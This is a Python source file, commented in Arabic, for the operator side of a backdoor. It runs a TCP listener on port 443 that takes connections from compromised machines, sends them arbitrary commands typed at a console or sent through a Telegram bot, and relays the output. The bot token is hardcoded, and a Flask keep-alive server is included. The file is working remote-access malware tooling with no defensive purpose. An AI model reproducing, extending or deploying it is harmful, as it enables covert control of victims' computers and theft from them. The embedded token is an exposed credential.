import socket
import threading
import json
import time
from flask import Flask
from threading import Thread
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler

# إعدادات الألوان
gold = "\033[0;33m"
white = "\033[0;38m"
bn = "\033[0;35m"
blue = "\033[0;36m"
red = "\033[0;31m"
green = "\033[0;32m"
command = ""

# تعريف كلاس الاستماع
class Lisning:
    def __init__(self, ip, port):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((ip, port))
        self.server_socket.listen(5)
        self.clients = []

    def save_send(self, conn, data):
        # إرسال البيانات إلى العميل
        json_data = json.dumps(data).encode()
        conn.send(json_data)

    def save_receive(self, conn):
        # استقبال البيانات من العميل
        json_data = b""
        while True:
            try:
                bytes_read = conn.recv(1024)
                if len(bytes_read) < 1024:
                    json_data += bytes_read
                    break
                json_data += bytes_read
            except:
                break
        return json.loads(json_data.decode("utf-8"))

    def broadcast_command(self, conn):
        try:
            while True:
                # انتظار الأوامر من البوت
                command = input(f"{green}Enter command to execute: ")
                self.save_send(conn, command)  # إرسال الأمر إلى العميل
                time.sleep(2)
                result = self.save_receive(conn)  # استقبال النتيجة
                print(f"Result: {result}")
        except Exception as ex:
            print(f"{red}Client closed the connection!")
            self.clients.remove(conn)

    def start(self):
        """بدء الاستماع لعدة عملاء"""
        while True:
            conn, addr = self.server_socket.accept()
            self.clients.append(conn)
            print(f"{gold}Connection established with {addr}")

            # التعامل مع العميل المتصل
            threading.Thread(target=self.broadcast_command, args=(conn,)).start()

# خادم الويب للحفاظ على النشاط
app = Flask("")

@app.route("/")
def home():
    return "Server is running!"

def run():
    app.run(host="0.0.0.0", port=8080)

def keep_alive():
    server = Thread(target=run)
    server.start()

# إعداد بوت التليجرام
async def start(update: Update, context):
    await update.message.reply_text("Welcome! Send any command to execute.")

async def handle_message(update: Update, context):
    command = update.message.text  # استلام الأمر من البوت
    await update.message.reply_text(f"Executing: {command}")

    # إرسال الأمر إلى العميل المتصل
    if my_backdoor.clients:
        try:
            my_backdoor.save_send(my_backdoor.clients[0], command)  # إرسال الأمر لأول عميل
            result = my_backdoor.save_receive(my_backdoor.clients[0])  # استقبال النتيجة
            await update.message.reply_text(f"Result:\n{result}")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")
    else:
        await update.message.reply_text("No clients connected.")

# بدء خادم الويب
keep_alive()

# بدء الخيط المخصص للسيرفر
my_backdoor = Lisning("0.0.0.0", 443)
server_thread = threading.Thread(target=my_backdoor.start)
server_thread.start()

# بدء البوت
application = Application.builder().token("7783960116:AAFJKsUgDyTgW6VuSGUrnSQiXiZIDuVuQqk").build()

application.add_handler(CommandHandler("start", start))
application.add_handler(MessageHandler(None, handle_message))

application.run_polling()
